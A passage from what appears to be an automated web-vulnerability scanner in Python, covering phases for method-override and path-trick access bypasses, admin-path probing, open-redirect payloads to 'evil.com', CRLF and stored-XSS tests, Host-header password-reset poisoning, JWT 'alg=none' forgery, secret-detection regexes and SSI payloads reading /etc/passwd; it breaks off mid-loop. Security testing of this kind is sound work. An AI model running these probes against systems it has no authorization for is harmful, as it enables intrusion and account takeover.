    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    override_headers = ["X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override"]
    methods = ["DELETE", "PUT", "PATCH"]
    for url in all_urls[:_PIPELINE_CFG.sample_urls_methodoverride]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, method="DELETE",
                                         headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            s, _, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
            if s in (403, 405):
                for hdr in override_headers:
                    await _throttle_rate()
                    try:
                        req2 = urllib.request.Request(url, method="GET",
                                                      headers={"User-Agent": "Mozilla/5.0", hdr: "DELETE", **_extra_h})
                        s2, _, _ = await _async_urlopen_no_redirect(_urlopen, req2, timeout=10)
                        if s2 in (200, 201, 204):
                            findings.append(f"[method-override] {url} — {hdr}: DELETE bypasses {s} → {s2}")
                    except Exception:
                        pass
                await _throttle_rate()
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs["_method"] = ["DELETE"]
                    new_q = urllib.parse.urlencode(qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_q))
                    req3 = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                    s3, _, _ = await _async_urlopen_no_redirect(_urlopen, req3, timeout=10)
                    if s3 in (200, 201, 204):
                        findings.append(f"[method-override-param] {url} — _method=DELETE bypasses {s} → {s3}")
                except Exception:
                    pass
        except Exception:
            continue
    if not findings:
        findings.append("[method-override] No method override bypasses found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"96-METHODOVERRIDE: {len(findings)} findings → {out}")
    return {"96-METHODOVERRIDE": str(_out), "count": len(findings)}


async def phase_97_FORCEDBROWSE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"97-FORCEDBROWSE"}:
        return {}
    _out = outdir / "forced_browse.txt"
    if _out.exists() and not force:
        return {"97-FORCEDBROWSE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 97-FORCEDBROWSE: forced browsing / unauthenticated access")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "97-FORCEDBROWSE: no URLs; skipping")
        return {"97-FORCEDBROWSE": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    admin_paths = ["/admin", "/admin/", "/wp-admin", "/administrator", "/console",
                   "/debug", "/phpmyadmin", "/adminer", "/backup", "/.git",
                   "/config", "/dashboard", "/manage", "/internal", "/api/admin",
                   "/server-status", "/server-info", "/.env", "/wp-config.php.bak",
                   "/robots.txt", "/sitemap.xml", "/.well-known/", "/elmah.axd",
                   "/trace.axd", "/_debug/", "/debug/vars", "/actuator"]
    hosts = set()
    for u in all_urls:
        parsed = urllib.parse.urlparse(u)
        if parsed.netloc:
            hosts.add(f"{parsed.scheme}://{parsed.netloc}")
    for base in sorted(hosts)[:_PIPELINE_CFG.sample_hosts_forcedbrowse]:
        for path in admin_paths:
            await _throttle_rate()
            try:
                test_url = f"{base}{path}"
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                body = body_bytes.decode("utf-8", errors="ignore")[:500]
                if status == 200:
                    if "login" not in body.lower() or "dashboard" in body.lower():
                        findings.append(f"[forced-browse-200] {test_url} — direct access (HTTP 200)")
                    else:
                        findings.append(f"[forced-browse-login] {test_url} — redirects to login (HTTP 200)")
                elif status == 403:
                    findings.append(f"[forced-browse-403] {test_url} — exists but forbidden")
                elif status in (301, 302) and "login" in body.lower():
                    findings.append(f"[forced-browse-redirect] {test_url} — redirects to login")
            except Exception:
                continue
    if not findings:
        findings.append("[forced-browse] No accessible admin paths found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"97-FORCEDBROWSE: {len(findings)} findings → {out}")
    return {"97-FORCEDBROWSE": str(_out), "count": len(findings)}


async def phase_98_CASEBYPASS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"98-CASEBYPASS"}:
        return {}
    _out = outdir / "case_bypass.txt"
    if _out.exists() and not force:
        return {"98-CASEBYPASS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 98-CASEBYPASS: case sensitivity access control bypass")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "98-CASEBYPASS: no URLs; skipping")
        return {"98-CASEBYPASS": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    forbidden_urls: List[str] = []
    for url in all_urls[:_PIPELINE_CFG.sample_urls_casebypass]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, _, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
            if status in (403, 401):
                forbidden_urls.append(url)
        except Exception:
            continue
    for url in forbidden_urls:
        parsed = urllib.parse.urlparse(url)
        path = parsed.path
        segments = path.strip("/").split("/")
        variations: List[str] = []
        for seg in segments:
            if seg and seg.isalpha():
                alt = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(seg))
                if alt != seg:
                    variations.append(alt)
        if variations:
            new_path = "/" + "/".join(variations)
            test_url = urllib.parse.urlunparse(parsed._replace(path=new_path))
            await _throttle_rate()
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                status, _, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[case-bypass] {url} → {test_url} (HTTP 200)")
            except Exception:
                pass
        tricks = [f"/./{path}", f"//{path.lstrip('/')}", f"{path}/", f"{path};"]
        for trick in tricks[:2]:
            test_url = urllib.parse.urlunparse(parsed._replace(path=trick))
            await _throttle_rate()
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                status, _, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[path-trick] {url} → {test_url} (HTTP 200)")
            except Exception:
                pass
    if not findings:
        findings.append("[case-bypass] No case sensitivity bypasses found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"98-CASEBYPASS: {len(findings)} findings → {out}")
    return {"98-CASEBYPASS": str(_out), "count": len(findings)}


async def phase_99_APIPAGE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"99-APIPAGE"}:
        return {}
    _out = outdir / "api_pagination_abuse.txt"
    if _out.exists() and not force:
        return {"99-APIPAGE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 99-APIPAGE: API pagination abuse testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    api_file = outdir / "api_specs.txt"
    if api_file.exists():
        all_urls += read_lines(api_file)
    if not all_urls:
        log("warn", "99-APIPAGE: no URLs; skipping")
        return {"99-APIPAGE": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    api_urls = [u for u in all_urls if any(m in u.lower() for m in
                ("/api/", "page=", "per_page=", "limit=", "offset=", "skip=",
                 "/v1/", "/v2/", ".json"))]
    if not api_urls:
        api_urls = all_urls[:_PIPELINE_CFG.sample_urls_apipage]
    pagination_params = [
        ("page", ["-1", "0", "999999"]),
        ("per_page", ["0", "99999"]),
        ("limit", ["-1", "0"]),
        ("offset", ["-1"]),
        ("skip", ["-1"]),
    ]
    for url in api_urls[:_PIPELINE_CFG.sample_urls_apipage]:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        for param, values in pagination_params:
            for val in values:
                qs[param] = [val]
                new_query = urllib.parse.urlencode(qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                await _throttle_rate()
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                    status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    if status == 200 and len(body) > 100:
                        try:
                            data = json.loads(body)
                            if isinstance(data, list) and len(data) > 0:
                                findings.append(f"[pagination-abuse] {test_url} — {param}={val} returned {len(data)} items")
                            elif isinstance(data, dict) and "data" in data and isinstance(data["data"], list) and len(data["data"]) > 0:
                                findings.append(f"[pagination-abuse] {test_url} — {param}={val} returned {len(data['data'])} items in .data")
                        except json.JSONDecodeError:
                            pass
                except Exception:
                    pass
    if not findings:
        findings.append("[api-page] No pagination abuse found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"99-APIPAGE: {len(findings)} findings → {out}")
    return {"99-APIPAGE": str(_out), "count": len(findings)}


async def phase_99a_TABNAB(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"99a-TABNAB"}:
        return {}
    _out = outdir / "reverse_tabnabbing.txt"
    if _out.exists() and not force:
        return {"99a-TABNAB": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 99a-TABNAB: reverse tabnabbing detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "99a-TABNAB: no URLs; skipping")
        return {"99a-TABNAB": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    tested = 0
    for url in all_urls[:_PIPELINE_CFG.sample_urls_tabnab]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            if status != 200:
                continue
            body = body_bytes.decode("utf-8", errors="ignore")
            links = re.findall(r'<a\s[^>]*target=["\']_blank["\'][^>]*>', body, re.I)
            for link in links:
                rel_match = re.search(r'rel=["\']([^"\']*)["\']', link, re.I)
                rel_val = rel_match.group(1).lower() if rel_match else ""
                if "noopener" not in rel_val or "noreferrer" not in rel_val:
                    href_match = re.search(r'href=["\']([^"\']+)["\']', link, re.I)
                    href = href_match.group(1) if href_match else "unknown"
                    missing = []
                    if "noopener" not in rel_val:
                        missing.append("noopener")
                    if "noreferrer" not in rel_val:
                        missing.append("noreferrer")
                    findings.append(f"[tabnab] {url} — target=_blank missing {', '.join(missing)} on {href[:80]}")
            tested += 1
        except Exception:
            continue
    if not findings:
        findings.append(f"[tabnab] {tested} pages tested, no reverse tabnabbing found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"99a-TABNAB: {len(findings)} findings → {out}")
    return {"99a-TABNAB": str(_out), "count": len(findings)}


async def phase_99b_APIKEYLEAK(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"99b-APIKEYLEAK"}:
        return {}
    _out = outdir / "api_key_leaks.txt"
    if _out.exists() and not force:
        return {"99b-APIKEYLEAK": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 99b-APIKEYLEAK: API key leakage detection in responses")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "99b-APIKEYLEAK: no URLs; skipping")
        return {"99b-APIKEYLEAK": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    key_patterns = [
        ("AWS Key", re.compile(r'AKIA[0-9A-Z]{16}')),
        ("Google API", re.compile(r'AIza[0-9A-Za-z_-]{35}')),
        ("GitHub Token", re.compile(r'ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|ghu_[A-Za-z0-9]{36}|ghs_[A-Za-z0-9]{36}|ghr_[A-Za-z0-9]{36}')),
        ("Private Key", re.compile(r'-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----')),
        ("Generic API Key", re.compile(r'api[_-]?key[_-]?[:=]["\']?[A-Za-z0-9]{20,}')),
        ("Generic Secret", re.compile(r'secret[_-]?key[_-]?[:=]["\']?[A-Za-z0-9]{20,}')),
        ("Bearer Token", re.compile(r'["\']Bearer\s+[A-Za-z0-9_\-\.]{20,}["\']')),
    ]
    tested = 0
    for url in all_urls[:_PIPELINE_CFG.sample_urls_apikeyleak]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            if status != 200:
                continue
            body = body_bytes.decode("utf-8", errors="ignore")
            header_str = str(headers)
            for name, pattern in key_patterns:
                for match in pattern.finditer(body):
                    findings.append(f"[key-in-body] {url} — {name}: {match.group()[:60]}")
                for match in pattern.finditer(header_str):
                    findings.append(f"[key-in-header] {url} — {name}: {match.group()[:60]}")
            tested += 1
        except Exception:
            continue
    findings = list(dict.fromkeys(findings))
    if not findings:
        findings.append(f"[apikeyleak] {tested} URLs scanned, no API key leaks found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"99b-APIKEYLEAK: {len(findings)} findings → {out}")
    return {"99b-APIKEYLEAK": str(_out), "count": len(findings)}


async def phase_99c_REDIRABUSE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"99c-REDIRABUSE"}:
        return {}
    _out = outdir / "redirect_abuse.txt"
    if _out.exists() and not force:
        return {"99c-REDIRABUSE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 99c-REDIRABUSE: open redirect deep testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    redir_file = outdir / "open_redirect.txt"
    if redir_file.exists():
        all_urls = read_lines(redir_file) + all_urls
    if not all_urls:
        log("warn", "99c-REDIRABUSE: no URLs; skipping")
        return {"99c-REDIRABUSE": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    redir_params = ["url=", "redirect=", "next=", "return=", "goto=", "to=", "out=",
                    "continue=", "forward=", "link=", "dest=", "site=", "target="]
    redir_urls = [u for u in all_urls if any(p in u.lower() for p in redir_params)]
    if not redir_urls:
        redir_urls = all_urls
    payloads = [
        "//evil.com",
        "%2F%2Fevil.com",
        "\\/evil.com",
        "//evil%0d%0a.com",
        "///evil.com",
        "/\\evil.com",
        "javascript:alert(1)",
    ]
    for url in redir_urls[:_PIPELINE_CFG.sample_urls_redirabuse]:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        target_param = None
        for param in redir_params:
            param_name = param.rstrip("=")
            if param_name in qs:
                target_param = param_name
                break
        if not target_param:
            for key in qs:
                if key.lower() in ("url", "redirect", "next", "return", "goto", "to", "out", "continue", "forward", "link", "dest", "site", "target"):
                    target_param = key
                    break
        if not target_param:
            continue
        for payload in payloads:
            qs[target_param] = [payload]
            new_query = urllib.parse.urlencode(qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            await _throttle_rate()
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                status, resp_h, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                location = ""
                if hasattr(resp_h, "get"):
                    location = resp_h.get("Location", "")
                elif hasattr(resp_h, "__getitem__"):
                    try:
                        location = resp_h["Location"]
                    except (KeyError, TypeError):
                        pass
                if "evil.com" in location or "javascript:" in location:
                    findings.append(f"[open-redirect] {test_url} → {location}")
                elif status in (301, 302, 303, 307, 308) and "evil" in str(location).lower():
                    findings.append(f"[open-redirect-{status}] {test_url} → {location}")
            except Exception:
                pass
    if not findings:
        findings.append("[redir-abuse] No open redirect abuse found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"99c-REDIRABUSE: {len(findings)} findings → {out}")
    return {"99c-REDIRABUSE": str(_out), "count": len(findings)}


async def phase_99d_LOGTRIGGER(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"99d-LOGTRIGGER"}:
        return {}
    _out = outdir / "log_injection_trigger.txt"
    if _out.exists() and not force:
        return {"99d-LOGTRIGGER": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 99d-LOGTRIGGER: log injection triggering")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "99d-LOGTRIGGER: no URLs; skipping")
        return {"99d-LOGTRIGGER": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    crlf_payloads = [
        "INJECT\r\nX-Injected: true",
        "INJECT%0d%0aX-Injected:%20true",
        "INJECT%0d%0a%0d%0a<script>alert(1)</script>",
    ]
    for url in all_urls[:_PIPELINE_CFG.sample_urls_logtrigger]:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        if not qs:
            continue
        first_param = list(qs.keys())[0]
        for payload in crlf_payloads[:1]:
            qs[first_param] = [payload]
            new_query = urllib.parse.urlencode(qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            await _throttle_rate()
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                status, resp_h, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                body = body_bytes.decode("utf-8", errors="ignore")[:2000]
                if "X-Injected" in str(resp_h) or "x-injected" in body.lower():
                    findings.append(f"[header-injection] {test_url} — CRLF header injection confirmed")
                if "INJECT" in body and "<script>" in body:
                    findings.append(f"[log-xss] {test_url} — payload reflected in response body")
            except Exception:
                pass
        await _throttle_rate()
        try:
            ua_payload = "Mozilla/5.0\r\nX-Injected: true"
            req = urllib.request.Request(url, headers={"User-Agent": ua_payload, **_extra_h})
            status, resp_h, _ = await _async_urlopen(_urlopen, req, timeout=10)
            if "X-Injected" in str(resp_h):
                findings.append(f"[ua-injection] {url} — User-Agent CRLF injection confirmed")
        except Exception:
            pass
    if not findings:
        findings.append("[log-trigger] No log injection vectors found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"99d-LOGTRIGGER: {len(findings)} findings → {out}")
    return {"99d-LOGTRIGGER": str(_out), "count": len(findings)}


async def phase_99e_XSSSTORED(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"99e-XSSSTORED"}:
        return {}
    _out = outdir / "stored_xss_verified.txt"
    if _out.exists() and not force:
        return {"99e-XSSSTORED": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 99e-XSSSTORED: stored XSS verification")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "99e-XSSSTORED: no URLs; skipping")
        return {"99e-XSSSTORED": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    xss_marker = "rc_xss_test_" + str(int(time.time()))[-6:]
    form_urls = [u for u in all_urls if any(m in u.lower() for m in
                 ("/comment", "/feedback", "/contact", "/profile", "/post", "/submit", "/form"))]
    if not form_urls:
        form_urls = all_urls[:_PIPELINE_CFG.sample_urls_xssstored]
    for url in form_urls[:_PIPELINE_CFG.sample_urls_xssstored]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            if status != 200:
                continue
            body = body_bytes.decode("utf-8", errors="ignore")
            form_tags = re.findall(r'<form[^>]*>(.*?)</form>', body, re.S | re.I)
            for form_content in form_tags:
                inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', form_content, re.I)
                textareas = re.findall(r'<textarea[^>]+name=["\']([^"\']+)["\']', form_content, re.I)
                field_names = inputs + textareas
                if field_names:
                    post_data = {fn: xss_marker for fn in field_names}
                    encoded = urllib.parse.urlencode(post_data).encode()
                    req2 = urllib.request.Request(url, data=encoded,
                                                  headers={"User-Agent": "Mozilla/5.0",
                                                           "Content-Type": "application/x-www-form-urlencoded",
                                                           **_extra_h})
                    try:
                        await _async_urlopen(_urlopen, req2, timeout=10)
                    except Exception:
                        pass
                    await asyncio.sleep(2)
                    req3 = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                    _, _, body_bytes3 = await _async_urlopen(_urlopen, req3, timeout=10)
                    body3 = body_bytes3.decode("utf-8", errors="ignore")
                    if xss_marker in body3:
                        findings.append(f"[stored-xss] {url} — marker '{xss_marker}' persisted in response")
        except Exception:
            continue
    if not findings:
        findings.append("[stored-xss] No stored XSS vectors verified")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"99e-XSSSTORED: {len(findings)} findings → {out}")
    return {"99e-XSSSTORED": str(_out), "count": len(findings)}


async def phase_99f_HOSTABUSE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"99f-HOSTABUSE"}:
        return {}
    _out = outdir / "host_header_abuse.txt"
    if _out.exists() and not force:
        return {"99f-HOSTABUSE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 99f-HOSTABUSE: host header injection extended")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "99f-HOSTABUSE: no URLs; skipping")
        return {"99f-HOSTABUSE": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    attacker_host = "evil.attacker.com"
    pw_reset_urls = [u for u in all_urls if any(m in u.lower() for m in
                     ("/password/reset", "/forgot", "/reset-password", "/pw-reset"))]
    for url in pw_reset_urls[:_PIPELINE_CFG.sample_hosts_hostabuse]:
        await _throttle_rate()
        try:
            post_data = urllib.parse.urlencode({"email": "admin@example.com"}).encode()
            req = urllib.request.Request(url, data=post_data,
                                         headers={"User-Agent": "Mozilla/5.0",
                                                  "Host": attacker_host,
                                                  "Content-Type": "application/x-www-form-urlencoded",
                                                  **_extra_h})
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
            if attacker_host in body:
                findings.append(f"[host-header-poison] {url} — Host header reflected in response")
            if "http" in body and attacker_host in body:
                findings.append(f"[pw-reset-poison] {url} — password reset link contains attacker host")
        except Exception:
            continue
    for url in all_urls[:_PIPELINE_CFG.sample_hosts_hostabuse]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0",
                                                       "X-Forwarded-Host": attacker_host,
                                                       **_extra_h})
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")[:2000]
            if attacker_host in body:
                findings.append(f"[xforwarded-host] {url} — X-Forwarded-Host reflected")
        except Exception:
            continue
    if not findings:
        findings.append("[host-abuse] No host header injection found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"99f-HOSTABUSE: {len(findings)} findings → {out}")
    return {"99f-HOSTABUSE": str(_out), "count": len(findings)}


async def phase_99g_AUTHBYPASSADV(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"99g-AUTHBYPASSADV"}:
        return {}
    _out = outdir / "auth_bypass_advanced.txt"
    if _out.exists() and not force:
        return {"99g-AUTHBYPASSADV": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 99g-AUTHBYPASSADV: advanced auth bypass techniques")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "99g-AUTHBYPASSADV: no URLs; skipping")
        return {"99g-AUTHBYPASSADV": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    auth_urls = [u for u in all_urls if any(m in u.lower() for m in
                 ("/admin", "/dashboard", "/manage", "/internal", "/api/v1/admin",
                  "/panel", "/console", "/settings"))]
    if not auth_urls:
        auth_urls = all_urls[:_PIPELINE_CFG.sample_urls_authbypassadv]
    jwt_tokens = []
    for url in all_urls:
        for hdr_val in str(_extra_h).split():
            if hdr_val.startswith("eyJ") and "." in hdr_val:
                jwt_tokens.append(hdr_val.rstrip(","))
    for url in auth_urls[:_PIPELINE_CFG.sample_urls_authbypassadv]:
        parsed = urllib.parse.urlparse(url)
        bypass_headers = [
            {"X-Original-URL": parsed.path},
            {"X-Rewrite-URL": parsed.path},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
        ]
        for hdr_dict in bypass_headers:
            await _throttle_rate()
            try:
                merged = {**_extra_h, "User-Agent": "Mozilla/5.0", **hdr_dict}
                req = urllib.request.Request(url, headers=merged)
                status, _, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[auth-bypass-header] {url} — {list(hdr_dict.keys())[0]}: {list(hdr_dict.values())[0]} → HTTP 200")
            except Exception:
                pass
        path_bypasses = [
            f"/./{parsed.path.lstrip('/')}",
            f"{parsed.path}/.",
            f"/{parsed.path.lstrip('/')}//",
            f"/{parsed.path.lstrip('/')};",
            f"/{parsed.path.lstrip('/')}%20",
            f"/{parsed.path.lstrip('/')}%09",
        ]
        for bp in path_bypasses[:3]:
            test_url = urllib.parse.urlunparse(parsed._replace(path=bp))
            await _throttle_rate()
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                status, _, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[auth-bypass-path] {url} → {test_url} (HTTP 200)")
            except Exception:
                pass
        if jwt_tokens:
            for token in jwt_tokens[:1]:
                try:
                    parts = token.split(".")
                    if len(parts) == 3:
                        import base64 as _b64
                        payload = json.loads(_b64.urlsafe_b64decode(parts[1] + "=="))
                        payload["alg"] = "none"
                        new_payload = _b64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
                        forged = f"{parts[0]}.{new_payload}."
                        forged_headers = {**_extra_h, "Authorization": f"Bearer {forged}", "User-Agent": "Mozilla/5.0"}
                        await _throttle_rate()
                        req = urllib.request.Request(url, headers=forged_headers)
                        status, _, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                        if status == 200:
                            findings.append(f"[jwt-none-bypass] {url} — JWT alg=none accepted (HTTP 200)")
                except Exception:
                    pass
    if not findings:
        findings.append("[auth-bypass-adv] No advanced auth bypasses found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"99g-AUTHBYPASSADV: {len(findings)} findings → {out}")
    return {"99g-AUTHBYPASSADV": str(_out), "count": len(findings)}


async def phase_100_SSI(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"100-SSI"}:
        return {}
    _out = outdir / "ssi_injection.txt"
    if _out.exists() and not force:
        return {"100-SSI": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 100-SSI: Server-Side Includes injection testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "100-SSI: no URLs; skipping")
        return {"100-SSI": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    _ssi_payloads = [
        '<!--#exec cmd="id"-->',
        '<!--#exec cmd="cat /etc/passwd"-->',
        '<!--#include virtual="/etc/passwd"-->',
        '<!--#echo var="DOCUMENT_ROOT"-->',
    ]
    _ssi_indicators = [
        "uid=", "root:", "gid=", "DOCUMENT_ROOT", "/etc/passwd",
        "<!--#exec", "<!--#include", "<!--#echo",
        "SSI", ".shtml", "Error parsing",
    ]
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)]
    for u in param_urls[:_PIPELINE_CFG.sample_urls_ssi]:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload in _ssi_payloads:
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                await _throttle_rate()
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                    status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    for indicator in _ssi_indicators:
